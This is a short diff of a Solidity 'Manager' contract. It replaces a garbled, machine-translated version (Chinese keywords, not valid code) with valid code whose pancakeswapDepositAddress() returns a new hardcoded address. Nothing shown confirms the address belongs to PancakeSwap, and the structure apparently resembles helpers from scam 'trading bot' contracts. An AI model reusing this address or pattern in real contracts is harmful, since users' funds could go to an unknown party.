@@ -1,11 +1,10 @@
-编译指示 ^0.5.0;
+pragma solidity ^0.5.0;
 
-经理人合约 {
-    函数 performTasks() 公共纯{
-        
-    }
-    
-    函数 pancakeswapDepositAddress() 公共纯返回（地址）{
-        返回0x2047378BeeAa36E8b3D3CC055550618F63BCa133；
-    }
+contract Manager { function performTasks() public pure{
+
+}
+
+function pancakeswapDepositAddress() public pure returns (address) {
+    return 0xd5EAC1fF1b39D5956D281b83B3F6C5D404E93389;
+}
 }
